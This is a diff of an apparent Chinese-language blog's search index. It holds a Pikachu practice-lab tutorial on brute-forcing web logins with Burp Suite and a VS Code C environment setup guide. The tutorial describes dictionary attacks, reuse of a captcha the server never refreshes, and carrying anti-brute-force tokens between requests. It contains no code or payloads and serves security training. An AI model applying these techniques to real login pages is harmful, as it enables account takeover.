-<ul>
-<li><p>设置为手动代理，填上127.0.0.1(这是本地IP)，端口8080(对应burpsuite的端口),点击确认</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130956513.png" loading="lazy"></p>
-</li>
-</ul>
-<ol start="2">
-<li><p>打开burpsuite开启拦截，让后在页面填入账号：admin ，密码：随便，然后点击login</p>
-<p> <img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130956322.png" loading="lazy"></p>
-</li>
-<li><p>burpsuite已抓到post包，右键选择发送给intruder</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130957512.png" loading="lazy"></p>
-</li>
-<li><p>然后在测试区中点击位置，在右边点击clear清除，然后选中password中的密码（add选中），即是我们要pj的账号密码)，攻击类型选择最后一个</p>
-</li>
-</ol>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130957762.png" loading="lazy"></p>
-<p><a href="https://imgtu.com/i/qO7CKP"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130957888.png" alt="qO7CKP.png" loading="lazy"></a></p>
-<ol start="5">
-<li>添加密码字典</li>
-</ol>
-<p><a href="https://imgtu.com/i/qO7E5Q"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130957508.png" alt="qO7E5Q.png" loading="lazy"></a></p>
-<ol start="6">
-<li><p>开始破解</p>
-<p><a href="https://imgtu.com/i/qO7ZCj"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130957226.png" alt="qO7ZCj.png" loading="lazy"></a></p>
-</li>
-<li><p>完成</p>
-<p> <a href="https://imgtu.com/i/qO7QbT"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130957598.png" alt="qO7QbT.png" loading="lazy"></a></p>
-</li>
-</ol>
-<h2 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h2><ol>
-<li><p>和之前一样，设置代理，burpsuite拦截请求</p>
-<p><a href="https://imgtu.com/i/qO73aF"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130957953.png" alt="qO73aF.png" loading="lazy"></a></p>
-</li>
-<li><p>发给Repeater(重发器)</p>
-<p> <a href="https://imgtu.com/i/qO7854"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130957264.png" alt="qO7854.png" loading="lazy"></a></p>
-</li>
-<li><p>来到重发器，点击发送</p>
-<p><a href="https://imgtu.com/i/qO7YG9"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130958165.png" alt="qO7YG9.png" loading="lazy"></a></p>
-</li>
-<li><p>把响应这边的拖动条拖到最后，可以看到用户名或密码错误，再发送一次同意是账号密码错误，接着我们把验证码修改了发送就可以看到验证码错误了（这这里有点问题显示□）</p>
-<p><a href="https://imgtu.com/i/qO7Nx1"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130958346.png" alt="qO7Nx1.png" loading="lazy"></a></p>
-<p><code>这说明是验证码无条件不刷新，无条件不刷新是指在某一时间段内，无论登录失败多少次，只要不刷新页面，就可以无限次的使用同一个验证码来对一个或多个用户帐号进行暴力猜解.</code></p>
-</li>
-<li><p>接着我们回到代理这里，然后把内容发送测试器，像之前一样，在测试器里面把全部清楚了，再把密码处添加上，攻击类型第四个，把账号密码的文本加载进去，最后攻击。</p>
-</li>
-</ol>
-<p><a href="https://imgtu.com/i/qO7wqK"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130958298.png" alt="qO7wqK.png" loading="lazy"></a></p>
-<p><a href="https://imgtu.com/i/qO7yPH"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130958682.png" alt="qO7yPH.png" loading="lazy"></a></p>
-<p><a href="https://imgtu.com/i/qO7cRA"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130958911.png" alt="qO7cRA.png" loading="lazy"></a></p>
-<ol start="6">
-<li>长度唯一确定密码</li>
-</ol>
-<p><a href="https://imgtu.com/i/qO7gxI"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130958645.png" alt="qO7gxI.png" loading="lazy"></a></p>
-<h2 id="验证码绕过（on-dilent）"><a href="#验证码绕过（on-dilent）" class="headerlink" title="验证码绕过（on dilent）"></a>验证码绕过（on dilent）</h2><p>基本过程同上（抓包&gt;pj&gt;登录）</p>
-<h2 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a>token防爆破</h2><p><code>token由返回包确定，显然，每次我们登陆，token的值肯定会变化，token值错误无法验证账号密码的正确性，需要我们每一次发送请求包都要拿到上一个返回包的token值放在token包里面</code></p>
-<ol>
-<li>输入账号密码，开始抓包</li>
-</ol>
-<p><a href="https://imgtu.com/i/qO7fqf"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130958539.png" alt="qO7fqf.png" loading="lazy"></a></p>
-<p><a href="https://imgtu.com/i/qO74Z8"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130958791.png" alt="qO74Z8.png" loading="lazy"></a></p>
-<ol start="2">
-<li><p>像之前一样，在测试器里面把全部清楚了，再把密码和token处添加上</p>
-<p><a href="https://imgtu.com/i/qO77Gj"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130959725.png" alt="qO77Gj.png" loading="lazy"></a></p>
-</li>
-<li><p>线程数设为1（只有获取上一个请求返回的taken值才能，做下一次请求，无法并发)）</p>
-<p><a href="https://imgtu.com/i/qO7LMq"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130959447.png" alt="qO7LMq.png" loading="lazy"></a></p>
-</li>
-<li><p>在选项下面的Grep Extract点添加，获得回复，选中token的值复制然后确认</p>
-</li>
-</ol>
-<p><a href="https://imgtu.com/i/qO7XLV"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130959025.png" alt="qO7XLV.png" loading="lazy"></a></p>
-<pre><code>    最下面选中总是
-</code></pre>
-<p><a href="https://imgtu.com/i/qO7zoF"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130959755.png" alt="qO7zoF.png" loading="lazy"></a></p>
-<ol start="5">
-<li>在有效载荷中选择递归搜索，然后把值放在第一个请求的初始有效负载</li>
-</ol>
-<p><a href="https://imgtu.com/i/qOHwSs"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130959715.png" alt="qOHwSs.png" loading="lazy"></a></p>
-<ol start="6">
-<li>加载字典后攻击</li>
-</ol>
-<p><a href="https://imgtu.com/i/qOH2Y4"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130959202.png" alt="qOH2Y4.png" loading="lazy"></a></p>
-<p><a href="https://imgtu.com/i/qOHRfJ"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130959902.png" alt="qOHRfJ.png" loading="lazy"></a></p>
-<ol start="7">
-<li>唯一的长度,成功</li>
-</ol>
-<p><a href="https://imgtu.com/i/qOHfp9"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130959475.png" alt="qOHfp9.png" loading="lazy"></a></p>
 ]]></content>
       <categories>
         <category>学习</category>
@@ -4641,6 +4527,120 @@ Ruijie#terminal monitor </code></pre>
       </tags>
   </entry>
   <entry>
+    <title>Pikachu--暴力破解</title>
+    <url>/posts/95e7ce5d/</url>
+    <content><![CDATA[<h2 id="Burte-Force（暴力破解）概述"><a href="#Burte-Force（暴力破解）概述" class="headerlink" title="Burte Force（暴力破解）概述"></a>Burte Force（暴力破解）概述</h2><p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。<br>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：<br>1.是否要求用户设置复杂的密码；<br>2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；<br>3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；<br>4.是否采用了双因素认证；<br>…等等。</p>
+<h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><ol>
+<li>设置代理（这里以谷歌浏览器为例）</li>
+</ol>
+<ul>
+<li>点击右上角的三个点，选择设置、高级、系统、打开您计算机的代理设置</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130956010.png" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130956440.png" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130956733.png" loading="lazy"></p>
+<ul>
+<li>在Internet选项里点击 连接、局域网设置、</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130956489.png" loading="lazy"></p>
+<ul>
+<li><p>设置为手动代理，填上127.0.0.1(这是本地IP)，端口8080(对应burpsuite的端口),点击确认</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130956513.png" loading="lazy"></p>
+</li>
+</ul>
+<ol start="2">
+<li><p>打开burpsuite开启拦截，让后在页面填入账号：admin ，密码：随便，然后点击login</p>
+<p> <img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130956322.png" loading="lazy"></p>
+</li>
+<li><p>burpsuite已抓到post包，右键选择发送给intruder</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130957512.png" loading="lazy"></p>
+</li>
+<li><p>然后在测试区中点击位置，在右边点击clear清除，然后选中password中的密码（add选中），即是我们要pj的账号密码)，攻击类型选择最后一个</p>
+</li>
+</ol>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130957762.png" loading="lazy"></p>
+<p><a href="https://imgtu.com/i/qO7CKP"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130957888.png" alt="qO7CKP.png" loading="lazy"></a></p>
+<ol start="5">
+<li>添加密码字典</li>
+</ol>
+<p><a href="https://imgtu.com/i/qO7E5Q"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130957508.png" alt="qO7E5Q.png" loading="lazy"></a></p>
+<ol start="6">
+<li><p>开始破解</p>
+<p><a href="https://imgtu.com/i/qO7ZCj"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130957226.png" alt="qO7ZCj.png" loading="lazy"></a></p>
+</li>
+<li><p>完成</p>
+<p> <a href="https://imgtu.com/i/qO7QbT"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130957598.png" alt="qO7QbT.png" loading="lazy"></a></p>
+</li>
+</ol>
+<h2 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h2><ol>
+<li><p>和之前一样，设置代理，burpsuite拦截请求</p>
+<p><a href="https://imgtu.com/i/qO73aF"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130957953.png" alt="qO73aF.png" loading="lazy"></a></p>
+</li>
+<li><p>发给Repeater(重发器)</p>
+<p> <a href="https://imgtu.com/i/qO7854"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130957264.png" alt="qO7854.png" loading="lazy"></a></p>
+</li>
+<li><p>来到重发器，点击发送</p>
+<p><a href="https://imgtu.com/i/qO7YG9"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130958165.png" alt="qO7YG9.png" loading="lazy"></a></p>
+</li>
+<li><p>把响应这边的拖动条拖到最后，可以看到用户名或密码错误，再发送一次同意是账号密码错误，接着我们把验证码修改了发送就可以看到验证码错误了（这这里有点问题显示□）</p>
+<p><a href="https://imgtu.com/i/qO7Nx1"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130958346.png" alt="qO7Nx1.png" loading="lazy"></a></p>
+<p><code>这说明是验证码无条件不刷新，无条件不刷新是指在某一时间段内，无论登录失败多少次，只要不刷新页面，就可以无限次的使用同一个验证码来对一个或多个用户帐号进行暴力猜解.</code></p>
+</li>
+<li><p>接着我们回到代理这里，然后把内容发送测试器，像之前一样，在测试器里面把全部清楚了，再把密码处添加上，攻击类型第四个，把账号密码的文本加载进去，最后攻击。</p>
+</li>
+</ol>
+<p><a href="https://imgtu.com/i/qO7wqK"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130958298.png" alt="qO7wqK.png" loading="lazy"></a></p>
+<p><a href="https://imgtu.com/i/qO7yPH"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130958682.png" alt="qO7yPH.png" loading="lazy"></a></p>
+<p><a href="https://imgtu.com/i/qO7cRA"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130958911.png" alt="qO7cRA.png" loading="lazy"></a></p>
+<ol start="6">
+<li>长度唯一确定密码</li>
+</ol>
+<p><a href="https://imgtu.com/i/qO7gxI"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130958645.png" alt="qO7gxI.png" loading="lazy"></a></p>
+<h2 id="验证码绕过（on-dilent）"><a href="#验证码绕过（on-dilent）" class="headerlink" title="验证码绕过（on dilent）"></a>验证码绕过（on dilent）</h2><p>基本过程同上（抓包&gt;pj&gt;登录）</p>
+<h2 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a>token防爆破</h2><p><code>token由返回包确定，显然，每次我们登陆，token的值肯定会变化，token值错误无法验证账号密码的正确性，需要我们每一次发送请求包都要拿到上一个返回包的token值放在token包里面</code></p>
+<ol>
+<li>输入账号密码，开始抓包</li>
+</ol>
+<p><a href="https://imgtu.com/i/qO7fqf"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130958539.png" alt="qO7fqf.png" loading="lazy"></a></p>
+<p><a href="https://imgtu.com/i/qO74Z8"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130958791.png" alt="qO74Z8.png" loading="lazy"></a></p>
+<ol start="2">
+<li><p>像之前一样，在测试器里面把全部清楚了，再把密码和token处添加上</p>
+<p><a href="https://imgtu.com/i/qO77Gj"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130959725.png" alt="qO77Gj.png" loading="lazy"></a></p>
+</li>
+<li><p>线程数设为1（只有获取上一个请求返回的taken值才能，做下一次请求，无法并发)）</p>
+<p><a href="https://imgtu.com/i/qO7LMq"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130959447.png" alt="qO7LMq.png" loading="lazy"></a></p>
+</li>
+<li><p>在选项下面的Grep Extract点添加，获得回复，选中token的值复制然后确认</p>
+</li>
+</ol>
+<p><a href="https://imgtu.com/i/qO7XLV"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130959025.png" alt="qO7XLV.png" loading="lazy"></a></p>
+<pre><code>    最下面选中总是
+</code></pre>
+<p><a href="https://imgtu.com/i/qO7zoF"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130959755.png" alt="qO7zoF.png" loading="lazy"></a></p>
+<ol start="5">
+<li>在有效载荷中选择递归搜索，然后把值放在第一个请求的初始有效负载</li>
+</ol>
+<p><a href="https://imgtu.com/i/qOHwSs"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130959715.png" alt="qOHwSs.png" loading="lazy"></a></p>
+<ol start="6">
+<li>加载字典后攻击</li>
+</ol>
+<p><a href="https://imgtu.com/i/qOH2Y4"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130959202.png" alt="qOH2Y4.png" loading="lazy"></a></p>
+<p><a href="https://imgtu.com/i/qOHRfJ"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130959902.png" alt="qOHRfJ.png" loading="lazy"></a></p>
+<ol start="7">
+<li>唯一的长度,成功</li>
+</ol>
+<p><a href="https://imgtu.com/i/qOHfp9"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130959475.png" alt="qOHfp9.png" loading="lazy"></a></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>web安全</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>pikachu</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Suite汉化教程</title>
     <url>/posts/d334592a/</url>
     <content><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>下载所需安装包</p>
@@ -5016,6 +5016,174 @@ cond(no)-&gt;op</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>VS Code C语言开发环境配置</title>
+    <url>/posts/bfe43f2e/</url>
+    <content><![CDATA[<h2 id="安装VS-code"><a href="#安装VS-code" class="headerlink" title="安装VS code"></a>安装VS code</h2><p>VS code：<a href="https://code.visualstudio.com/">https://code.visualstudio.com</a></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103908.png" alt="1" loading="lazy"></p>
+<p>下载完成后双击安装</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103906.png" alt="2" loading="lazy"></p>
+<p>安装完成后，打开VS Code，在安装插件栏搜索chinese，找到简体中文版本，点击install，安装结束后重启应用完成汉化</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103914.png" alt="3" loading="lazy"></p>
+<h2 id="安装用于C-x2F-C-的插件"><a href="#安装用于C-x2F-C-的插件" class="headerlink" title="安装用于C&#x2F;C++的插件"></a>安装用于C&#x2F;C++的插件</h2><p>插件栏搜索Code Runner，点击安装</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103918.png" alt="4" loading="lazy"></p>
+<p>安装完成后在扩展设置中勾选<code>Ignore Selection</code>、<code>Run In Terminal</code></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103923.png" alt="5" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103926.png" alt="6" loading="lazy"></p>
+<p>插件栏搜索C&#x2F;C++,点击安装</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103930.png" alt="7" loading="lazy"></p>
+<h2 id="安装编译器MinGW-W64-GCC"><a href="#安装编译器MinGW-W64-GCC" class="headerlink" title="安装编译器MinGW-W64 GCC"></a>安装编译器MinGW-W64 GCC</h2><p>MinGW-W64 GCC：<a href="https://sourceforge.net/projects/mingw-w64">https://sourceforge.net/projects/mingw-w64</a></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103935.png" alt="8" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103938.png" alt="9" loading="lazy"></p>
+<p>下载完成后解压文件</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103941.png" alt="10" loading="lazy"></p>
+<p>在D盘新建文件夹（英文命名就行，中文总会有莫名其妙的问题），之后将解压的文件移动到刚刚新建的文件夹中</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103947.png" alt="11" loading="lazy"></p>
+<h2 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h2><p>打开mingw64，点开bin，将bin所在地址复制下来</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103951.png" alt="12" loading="lazy"></p>
+<p>打开设置，依次点击<code>系统</code>–<code>关于</code>–<code>高级系统设置</code>–<code>环境变量</code> 在<code>Administrator的用户变量</code>中编辑<code>Path</code>变量，点击空白处，将复制好的地址粘贴进去，点击确定</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103955.png" alt="13" loading="lazy"></p>
+<p>同样的步骤，在文件夹中找到inlude，点开，复制地址，粘贴到Path中</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103959.png" alt="14" loading="lazy"></p>
+<p>依次点击确定关闭窗口</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104003.png" alt="15" loading="lazy"></p>
+<p>完成后按下win+r，输入cmd，点击确定</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104008.png" alt="16" loading="lazy"></p>
+<p>弹出黑框后输入</p>
+<pre class="language-none"><code class="language-none">gcc -v -E -x c++ -</code></pre>
+
+
+<p>若显示结果如图 则配置成功</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104013.png" alt="17" loading="lazy"></p>
+<h2 id="配置三个文件-c-cpp-propertise-json、launch-json、tasks-json"><a href="#配置三个文件-c-cpp-propertise-json、launch-json、tasks-json" class="headerlink" title="配置三个文件 c_cpp_propertise.json、launch.json、tasks.json"></a>配置三个文件 c_cpp_propertise.json、launch.json、tasks.json</h2><p>先在电脑上新建一个文件夹（像我就是在我的电脑上新建一个叫<code>C--</code>的文件夹），打开它</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104018.png" alt="18" loading="lazy"></p>
+<p>之后新建三个文件，名字是<code>c_cpp_propertise.json</code>、 <code>launch.json</code>、 <code>tasks.json</code>，如图</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104021.png" alt="19" loading="lazy"></p>
+<p>接下来把相应内容写进去</p>
+<p>c_cpp_propertise.json</p>
+<blockquote>
+<p>在这个代码中，我们需要把地址改成自己的mingw 64 bin的地址</p>
+</blockquote>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>   
+    <span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>       
+     <span class="token punctuation">&#123;</span>          
+         <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Win32"</span><span class="token punctuation">,</span>       
+         <span class="token property">"includePath"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+         <span class="token string">"$&#123;workspaceRoot&#125;"</span><span class="token punctuation">,</span>               
+         <span class="token string">"D:/C/mingw64/include/**"</span><span class="token punctuation">,</span>               
+         <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++"</span><span class="token punctuation">,</span>
+         <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++/x86_64-w64-mingw32"</span><span class="token punctuation">,</span>
+         <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++/backward"</span><span class="token punctuation">,</span>
+         <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include"</span><span class="token punctuation">,</span>
+         <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include-fixed"</span><span class="token punctuation">,</span>
+         <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/include"</span>
+    <span class="token punctuation">]</span><span class="token punctuation">,</span>      
+    <span class="token property">"defines"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+        <span class="token string">"_DEBUG"</span><span class="token punctuation">,</span>               
+        <span class="token string">"UNICODE"</span><span class="token punctuation">,</span>
+        <span class="token string">"__GNUC__=6"</span><span class="token punctuation">,</span>               
+        <span class="token string">"__cdecl=__attribute__((__cdecl__))"</span>            
+        <span class="token punctuation">]</span><span class="token punctuation">,</span>           
+    <span class="token property">"intelliSenseMode"</span><span class="token operator">:</span> <span class="token string">"msvc-x64"</span><span class="token punctuation">,</span>
+    <span class="token property">"browse"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              
+        <span class="token property">"limitSymbolsToIncludedHeaders"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
+        <span class="token property">"databaseFilename"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
+        <span class="token property">"path"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                   
+            <span class="token string">"$&#123;workspaceRoot&#125;"</span><span class="token punctuation">,</span>                   
+            <span class="token string">"D:/C/mingw64/include/**"</span><span class="token punctuation">,</span>                   
+            <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++"</span><span class="token punctuation">,</span>
+            <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++/x86_64-w64-mingw32"</span><span class="token punctuation">,</span>
+            <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++/backward"</span><span class="token punctuation">,</span>
+            <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include"</span><span class="token punctuation">,</span>
+            <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include-fixed"</span><span class="token punctuation">,</span>
+            <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/include"</span>
+           <span class="token punctuation">]</span>        
+        <span class="token punctuation">&#125;</span>       
+     <span class="token punctuation">&#125;</span>   
+  <span class="token punctuation">]</span><span class="token punctuation">,</span>   
+   <span class="token property">"version"</span><span class="token operator">:</span> <span class="token number">4</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104027.png" alt="20" loading="lazy"></p>
+<p>launch.json</p>
+<blockquote>
+<p>在这个代码中，我们需要把地址改成自己的mingw 64 bin的地址</p>
+</blockquote>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  
+    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.2.0"</span><span class="token punctuation">,</span>
+    <span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>     
+        <span class="token punctuation">&#123;</span>           
+            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"(gdb) Launch"</span><span class="token punctuation">,</span> <span class="token comment">// 配置名称，将会在启动配置的下拉菜单中显示            </span>
+            <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"cppdbg"</span><span class="token punctuation">,</span> <span class="token comment">// 配置类型，这里只能为cppdbg           </span>
+            <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"launch"</span><span class="token punctuation">,</span> <span class="token comment">//请求配置类型，可以为launch（启动）或attach（附加）          </span>
+            <span class="token property">"program"</span><span class="token operator">:</span><span class="token string">"$&#123;workspaceFolder&#125;/$&#123;fileBasenameNoExtension&#125;.exe"</span><span class="token punctuation">,</span> <span class="token comment">// 将要进行调试的程序的路径</span>
+            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 程序调试时传递给程序的命令行参数，一般设为空即可            </span>
+            <span class="token property">"stopAtEntry"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token comment">// 设为true时程序将暂停在程序入口处，一般设置为false            </span>
+            <span class="token property">"cwd"</span><span class="token operator">:</span><span class="token string">"$&#123;workspaceFolder&#125;"</span><span class="token punctuation">,</span> <span class="token comment">// 调试程序时的工作目录，一般为$&#123;workspaceRoot&#125;即代码所在目录workspaceRoot已被弃用，现改为workspaceFolder            </span>
+            <span class="token property">"environment"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  
+            <span class="token property">"externalConsole"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">// 调试时是否显示控制台窗口，一般设置为true显示控制台           </span>
+            <span class="token property">"MIMode"</span><span class="token operator">:</span> <span class="token string">"gdb"</span><span class="token punctuation">,</span>            
+            <span class="token property">"miDebuggerPath"</span><span class="token operator">:</span><span class="token string">"D:/C/mingw64/bin/gdb.exe"</span><span class="token punctuation">,</span> <span class="token comment">// miDebugger的路径，注意这里要与MinGw的路径对应  </span>
+            <span class="token property">"preLaunchTask"</span><span class="token operator">:</span> <span class="token string">"gcc"</span><span class="token punctuation">,</span> <span class="token comment">// 调试会话开始前执行的任务，一般为编译程序，c++为g++, c为gcc      </span>
+            <span class="token property">"setupCommands"</span><span class="token operator">:</span> <span class="token punctuation">[</span>     
+                <span class="token punctuation">&#123;</span>                   
+                    <span class="token property">"description"</span><span class="token operator">:</span>     <span class="token string">"Enable pretty-printing for gdb"</span><span class="token punctuation">,</span>                   
